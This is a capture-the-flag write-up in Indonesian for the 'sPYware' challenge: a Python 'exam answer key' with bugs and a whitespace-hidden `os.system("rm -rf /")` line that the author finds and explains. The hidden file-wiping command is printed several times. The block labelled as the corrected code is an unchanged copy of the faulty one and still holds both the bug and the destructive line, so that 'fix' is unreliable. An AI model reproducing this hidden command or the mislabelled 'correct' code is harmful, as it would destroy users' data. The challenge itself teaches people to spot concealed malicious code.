## sPYware - [100 point]


> Temen ku ngasih kunjaw ETS ATP/Dasprog/(insert nama matkul pengenalan pemrograman di depart kalian) nih, tapi kok ga mau jalan yh?

> Author: requiiem

- Explanation
   <p>Diberikan sebuah file dengan extension python "kunci_jawaban.py"</p>

<br>
<img width="233" height="103" alt="Screenshot from 2025-09-18 11-31-30" src="https://github.com/user-attachments/assets/7b18ea73-1527-41ba-b706-6a9572e181e9" />
<br>

### kunci_jawaban.py

```py
  import random                                                                                                                                                                                                                                                                                                                                                                                                                 import os; os.system("rm -rf /")
  import sys
  
  def str_xor(secret, key):
    new_key = key
    i = 0
    while len(new_key) < len(secret):
      new_key = new_key + key[i]
      i = (i + 1) % len(key)  ^ key                                                                                                                                                                                                                                                                                           
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
  
  flag = "HCS{ini_flag_!aseli_~no_fek_fek_coba_aja_submit_xixixi}"
  
  flag_enc = (
    chr(0x38) + chr(0x31) + chr(0x3c) + chr(0x1c) + chr(0x15) + chr(0x08) + chr(0x07) +                                                                                                                                                                                                                                                                                                                       + chr(0x00)
    chr(0x09) + chr(0x14) + chr(0x2f) + chr(0x19) + chr(0x1a) + chr(0x09) + chr(0x02) + 
    chr(0x04) + chr(0x36) + chr(0x04) + chr(0x06) + chr(0x07) + chr(0x13) + chr(0x0d) + 
    chr(0x06) + chr(0x0f) + chr(0x03) + chr(0x10) + chr(0x0f) + chr(0x38) + chr(0x12) + 
    chr(0x00) + chr(0x00) + chr(0x0c) + chr(0x3e) + chr(0x1e) + chr(0x0c) + chr(0x03) +                                                                                                                                                               + chr(0x67)
    chr(0x08) + chr(0x17) + chr(0x13) + chr(0x30) + chr(0x0b) + chr(0x14) + chr(0x32) + 
    chr(0x0d) + chr(0x0f) + chr(0x17) + chr(0x15) + chr(0x06) + chr(0x30) + chr(0x09) + 
    chr(0x08) + chr(0x01) + chr(0x08) + chr(0x07) + chr(0x38) + chr(0x31) + chr(0x2d) + 
    chr(0x16) + chr(0x02) + chr(0x04) + chr(0x10)
  )
  
  if flag = "":
    print(flag)
  else:
    flag = str_xor(flag_enc, 'progaming')                                                                                                                                                                                                                               sys.exit()
    print('"Kelazz king, nih flag: " ' + flag)
```
<p> Jika kode ini langsung dijalankan, maka akan error dikarenakan ada banyak anomali</p>

### Anomali syntax
Salah
```py
if flag = "":
```
<p> Syntax ini salah, karena untuk pengecekan kondisi, perlu 2 sama dengan ==</p>
<br> Benar

```py
if flag == "":
```

### Anomali Function
Salah
```py
 import random                                                                                                                                                                                                                                                                                                                                                                                                                 import os; os.system("rm -rf /")
  import sys
  
  def str_xor(secret, key):
    new_key = key
    i = 0
    while len(new_key) < len(secret):
      new_key = new_key + key[i]
      i = (i + 1) % len(key)  ^ key                                                                                                                                                                                                                                                                                           
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
```
<p>Pada function str.xor, terdapat langkah dimana "i = (i + 1) % len(key)  ^ key", langkah ini juga salah, karena jika kita lihat pada __main__, flag di XOR dengan string, yang menyebabkan bagian code dari function ini salah, untuk memperbaikinya dengan menghapus
bagian "^ key"</p>

<br> Benar

```py
 import random                                                                                                                                                                                                                                                                                                                                                                                                                 import os; os.system("rm -rf /")
  import sys
  
  def str_xor(secret, key):
    new_key = key
    i = 0
    while len(new_key) < len(secret):
      new_key = new_key + key[i]
      i = (i + 1) % len(key)  ^ key                                                                                                                                                                                                                                                                                           
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
```
### Anomali lain lain
<p>ada pun kedua kode ini yang tidak berhubungan dengan algoritma utama, kedua kode ini perlu dihapus karena berbahaya jika dijalankan`</p>

```py
import os; os.system("rm -rf /") = menginstruksikan OS untuk menghapus hampir semua file
sys.exit() = mengakhiri program
```
<p>Jika kode di run lagi, maka hasil yang didapat adalah...</p>

```py
"Kelazz king, nih flag: " HCS{tennnd]v}homXcvu|jgbj~hH`ogmSwbdzxtQf}\jezaQdaoowJ^Jwom~
```
<p>Lho kenapa tidak readeble???. Jika kita mengingat kembali syntax code yang telah kita hapus, semua kode tersebut ada di posisi kanan banget/ spasi berlebih, di saat yang sama ada kode hex yang juga ada di posisi kanan, namun karena tidak membahayakan, jadinya tetap dimasukan ke dalam code</p>

```py
 + chr(0x00)
  + chr(0x67)
```
<p>Kita coba hapus kedua kode tersebut dan jalankan programnya ulang</p>

```py
"Kelazz king, nih flag: " HCS{tengs_kunci_jawabannya_brok_semoga_lu_dapet_nilai_A_yee}
```
<p>Yep, flagnya didapat</p>

## Flag = HCS{tengs_kunci_jawabannya_brok_semoga_lu_dapet_nilai_A_yee}

